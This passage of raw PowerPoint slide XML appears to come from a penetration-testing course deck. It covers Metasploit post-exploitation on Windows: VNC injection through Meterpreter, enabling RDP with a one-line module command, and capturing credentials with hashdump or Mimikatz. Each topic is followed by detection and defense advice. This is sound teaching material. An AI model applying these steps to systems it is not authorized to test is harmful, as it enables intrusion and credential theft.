              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>VNC Injection</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Text Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{267CAC20-9336-9740-8F65-CC0DBD6DC7B9}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="628650" y="1533832"/>
            <a:ext cx="7886700" cy="4811789"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit fontScale="55000" lnSpcReduction="20000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="114300" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>In the context of penetration testing using the </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0"/>
              <a:t>Metasploit Framework</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>, "VNC Injection" refers to a post-exploitation technique where an attacker, having already established a Meterpreter session on a target machine, injects a VNC (Virtual Network Computing) server into a running process on that machine. This allows the tester to gain a graphical user interface (GUI) session to the target remotely.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="114300" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>The process relies on </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0"/>
              <a:t>in-memory injection</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>, meaning the VNC server code is never written to the target's hard drive, which helps to evade some traditional file-based antivirus solutions.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="114300" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0"/>
              <a:t>The Mechanism of VNC Injection</a:t>
            </a:r>
            <a:endParaRPr lang="en-IN" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="114300" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>The workflow for executing this technique follows a specific chain of events within the memory space of the target operating system.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="114300" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0"/>
              <a:t>1. Establishing the Meterpreter Session</a:t>
            </a:r>
            <a:endParaRPr lang="en-IN" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="114300" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>Before any injection can occur, a Meterpreter session must be active. This is achieved by exploiting a vulnerability or using social engineering to execute a payload that initiates a reverse connection back to the attacker's listener (e.g., multi/handler).</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="114300" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0"/>
              <a:t>2. Selecting a Target Process</a:t>
            </a:r>
            <a:endParaRPr lang="en-IN" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="114300" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>Meterpreter must inject the VNC server into a host process. Stability is critical here. If the injected process crashes, the entire session is lost.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="114300" lvl="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>Testers typically choose a stable, long-running process that interacts with the user session, such as explorer.exe.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="114300" lvl="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>The migrate command is often used to move the Meterpreter agent into a more stable process (e.g., a system process or a specific user-space application) before attempting the VNC injection.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-IN" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="22048420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C8758-76F6-FD29-2BEE-2FA1A7DE43C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9B04BEC-DE0F-E521-45E2-9250B1658490}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit fontScale="55000" lnSpcReduction="20000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="114300" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0"/>
              <a:t>3. Execution of the VNC Module</a:t>
            </a:r>
            <a:endParaRPr lang="en-IN" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="114300" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>The post/windows/manage/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0" err="1"/>
              <a:t>vncinject</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t> module is loaded. When this module is executed, it performs the following technical actions:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="114300" lvl="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0"/>
              <a:t>DLL Injection:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t> The module loads a VNC server DLL (Dynamic Link Library) into the memory space of the target process.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="114300" lvl="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0"/>
              <a:t>Thread Execution:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t> It creates a remote thread within that process to execute the VNC server initialization code.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="114300" lvl="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0"/>
              <a:t>Memory Hooking:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t> The VNC server hooks into the Windows Graphics Device Interface (GDI) or the desktop's drawing functions to capture the screen state.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="114300" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0"/>
              <a:t>4. The Handshake</a:t>
            </a:r>
            <a:endParaRPr lang="en-IN" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="114300" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>Once the VNC server is running in memory, it binds to a specific port on the target machine (or routes through the existing Meterpreter connection, depending on the configuration). The attacker then uses a VNC viewer application to connect to the target IP and port.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="114300" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>The VNC server sends the desktop frame buffer (pixel data) to the viewer and receives keyboard and mouse input events from the viewer, executing them on the target machine as if they were local inputs.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-IN" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="2360900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D1FAC95-0017-C4D2-CAA0-ABD2B814EC79}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="628650" y="963562"/>
            <a:ext cx="7886700" cy="5382060"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit fontScale="47500" lnSpcReduction="20000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="114300" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0"/>
              <a:t>Key Technical Considerations</a:t>
            </a:r>
            <a:endParaRPr lang="en-IN" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="114300" lvl="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0"/>
              <a:t>Session Privileges:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t> To interact with a user's desktop, the injected process must be running in the context of the currently logged-in user. If the Meterpreter session is running as SYSTEM but the user is not logged in, VNC injection may fail or result in a blank screen.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="114300" lvl="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0"/>
              <a:t>Memory Footprint:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t> While the technique is "fileless," it is not invisible. Modern Endpoint Detection and Response (EDR) systems look for anomalous </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0" err="1"/>
              <a:t>behavior</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>, such as one process suddenly allocating executable memory in another process (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0" err="1"/>
              <a:t>VirtualAllocEx</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t> and </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0" err="1"/>
              <a:t>WriteProcessMemory</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t> API calls).</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="114300" lvl="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0"/>
              <a:t>Network Activity:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t> The initiation of a VNC connection creates distinct network traffic patterns. Monitoring tools typically flag the opening of VNC ports (usually 5900+) or the sudden transmission of screen-scraping data protocols from a workstation.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="114300" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0"/>
              <a:t>Detection and </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0" err="1"/>
              <a:t>Defense</a:t>
            </a:r>
            <a:endParaRPr lang="en-IN" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="114300" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>Defenders and security analysts identify these activities through several methods:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="114300" lvl="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0"/>
              <a:t>Memory Forensics:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t> Analysts can use tools like Volatility to inspect process memory for injected threads or unbacked executable code (code that exists in memory but is not associated with a file on disk).</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="114300" lvl="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0"/>
              <a:t>API Monitoring:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t> EDR solutions hook system APIs. They detect the "Cross-Process Injection" sequence—specifically calls to </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0" err="1"/>
              <a:t>OpenProcess</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0" err="1"/>
              <a:t>VirtualAllocEx</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0" err="1"/>
              <a:t>WriteProcessMemory</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>, and </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0" err="1"/>
              <a:t>CreateRemoteThread</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="114300" lvl="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0" err="1"/>
              <a:t>Behavioral</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0"/>
              <a:t> Analysis:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t> A process that is suddenly acting as a VNC server (listening on a port and sending GUI data) when it has no legitimate reason to do so is a high-fidelity indicator of compromise.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="114300" lvl="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0"/>
              <a:t>Network Segmentation:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t> Restricting outbound traffic to only known, approved ports prevents unauthorized remote access tools from successfully "calling home" or allowing external connections.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="114300" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t> </a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="299446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DBC16-F704-1979-BA31-DE698D7F40E9}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="628650" y="934578"/>
            <a:ext cx="7886700" cy="638583"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit fontScale="90000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>Remote Desktop (RDP</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Text Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{D5A843C3-95EF-408A-DEF7-FE4805A25931}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="628650" y="1573162"/>
            <a:ext cx="7886700" cy="4772460"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit fontScale="47500" lnSpcReduction="20000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="114300" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>Enabling Remote Desktop (RDP) on a target system via Meterpreter is a common post-exploitation technique used to gain persistent, interactive GUI access to a compromised host.</a:t>
            </a:r>
            <a:endParaRPr lang="en-IN" sz="1800" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="114300" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0"/>
              <a:t>Understanding the RDP Enablement Process</a:t>
            </a:r>
            <a:endParaRPr lang="en-IN" sz="1800" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="114300" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>When a tester has a Meterpreter session, the goal is to modify the target's registry and service configurations to permit RDP connections. The built-in Metasploit module post/windows/manage/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0" err="1"/>
              <a:t>enable_rdp</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t> automates this process by performing the following steps:</a:t>
            </a:r>
            <a:endParaRPr lang="en-IN" sz="1800" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="114300" lvl="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0"/>
              <a:t>Registry Modification:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t> It modifies the </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0" err="1"/>
              <a:t>fDenyTSConnections</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t> registry key. In Windows, setting this value to 0 enables Remote Desktop connections.</a:t>
            </a:r>
            <a:endParaRPr lang="en-IN" sz="1800" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="571500" lvl="1" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0"/>
              <a:t>Path:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t> HKEY_LOCAL_MACHINE\System\</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0" err="1"/>
              <a:t>CurrentControlSet</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>\Control\Terminal Server</a:t>
            </a:r>
            <a:endParaRPr lang="en-IN" sz="1600" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="114300" lvl="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0"/>
              <a:t>Firewall Configuration:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t> It creates a Windows Firewall exception to allow incoming traffic on TCP port 3389 (the default RDP port).</a:t>
            </a:r>
            <a:endParaRPr lang="en-IN" sz="1800" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="114300" lvl="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0"/>
              <a:t>Account Management:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t> It ensures that the user account being used for access has the necessary permissions. If the target is a domain environment, it may also need to add the user to the "Remote Desktop Users" group.</a:t>
            </a:r>
            <a:endParaRPr lang="en-IN" sz="1800" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="114300" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0"/>
              <a:t>Workflow for Execution</a:t>
            </a:r>
            <a:endParaRPr lang="en-IN" sz="1800" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="114300" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>Once you have a </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0" err="1"/>
              <a:t>meterpreter</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t> session, the following commands are typically used:</a:t>
            </a:r>
            <a:endParaRPr lang="en-IN" sz="1800" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="114300" lvl="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0"/>
              <a:t>Migrate:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t> Ensure the session is stable by migrating into a process like explorer.exe or svchost.exe.</a:t>
            </a:r>
            <a:endParaRPr lang="en-IN" sz="1800" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="114300" lvl="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0"/>
              <a:t>Enable RDP:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t> Execute the module via the Metasploit console:</a:t>
            </a:r>
            <a:endParaRPr lang="en-IN" sz="1800" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="114300" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>Bash run post/windows/manage/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0" err="1"/>
              <a:t>enable_rdp</a:t>
            </a:r>
            <a:endParaRPr lang="en-IN" sz="1800" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="114300" lvl="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0"/>
              <a:t>Credential Capture:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t> Often, before connecting, a tester will use </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0" err="1"/>
              <a:t>hashdump</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t> or kiwi (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0" err="1"/>
              <a:t>Mimikatz</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>) to retrieve the credentials of the logged-in user to ensure they have an account to authenticate with.</a:t>
            </a:r>
            <a:endParaRPr lang="en-IN" sz="1800" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="114300" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:endParaRPr lang="en-IN" sz="1800" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-IN" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="9357892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E8BC94-0413-00AE-17A0-C5D4EAB19F01}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="628650" y="943898"/>
            <a:ext cx="7886700" cy="5401724"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit fontScale="55000" lnSpcReduction="20000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="114300" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0"/>
              <a:t>Important Technical Caveats</a:t>
            </a:r>
            <a:endParaRPr lang="en-IN" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="114300" lvl="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0"/>
              <a:t>User Sessions:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t> Enabling RDP often requires a user to be logged in, or it may require a reboot or service restart to take full effect.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="114300" lvl="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0"/>
              <a:t>Network Level Authentication (NLA):</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t> Many modern Windows systems require NLA. If the RDP client you are using does not support NLA, you may not be able to authenticate even after the server is enabled.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="114300" lvl="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0"/>
              <a:t>Persistence:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t> Simply enabling RDP is not persistent. If the system restarts, you may need to ensure the service is set to start automatically, though the registry change made by the module is generally permanent until reverted.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="114300" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0"/>
              <a:t>Detection and </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0" err="1"/>
              <a:t>Defense</a:t>
            </a:r>
            <a:endParaRPr lang="en-IN" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="114300" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>Security teams monitor for these specific activities to identify unauthorized RDP enablement:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="114300" lvl="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0"/>
              <a:t>Registry Auditing:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t> Monitoring for changes to </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0" err="1"/>
              <a:t>fDenyTSConnections</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>. Security Information and Event Management (SIEM) systems should trigger an alert whenever this key is modified by a process that is not a legitimate administrative tool.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="114300" lvl="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0"/>
              <a:t>Firewall Log Analysis:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t> An alert should be generated when a new inbound rule for port 3389 is created or when the firewall profile is modified to allow terminal services.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="114300" lvl="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0"/>
              <a:t>Service Monitoring:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t> Unauthorized RDP usage can be detected by monitoring the </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0" err="1"/>
              <a:t>TermService</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t> (Terminal Services) logs and looking for successful logins from unexpected IP addresses.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="114300" lvl="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0"/>
              <a:t>Least Privilege:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t> By enforcing the Principle of Least Privilege, you ensure that even if an attacker enables RDP, the compromised user account may not have the rights to actually initiate a remote session.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-IN" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
